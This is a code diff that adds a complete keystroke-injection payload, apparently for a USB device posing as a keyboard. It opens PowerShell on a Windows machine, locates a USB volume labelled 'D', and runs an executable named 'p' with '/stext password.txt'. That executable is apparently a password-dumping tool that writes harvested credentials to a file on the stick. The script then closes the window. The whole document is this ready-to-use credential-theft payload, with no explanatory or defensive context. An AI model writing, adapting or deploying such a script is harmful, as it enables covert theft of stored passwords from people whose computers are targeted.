@@ -1,0 +1,26 @@
+DELAY 1700
+GUI R
+DELAY 350
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+STRING $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'D' } | select name
+DELAY 200
+ENTER
+DELAY 100
+STRING cd $usbPath.name
+DELAY 200
+ENTER
+DELAY 100
+STRING ./p /stext password.txt
+DELAY 300
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 400
+STRING exit
+DELAY 100
+ENTER
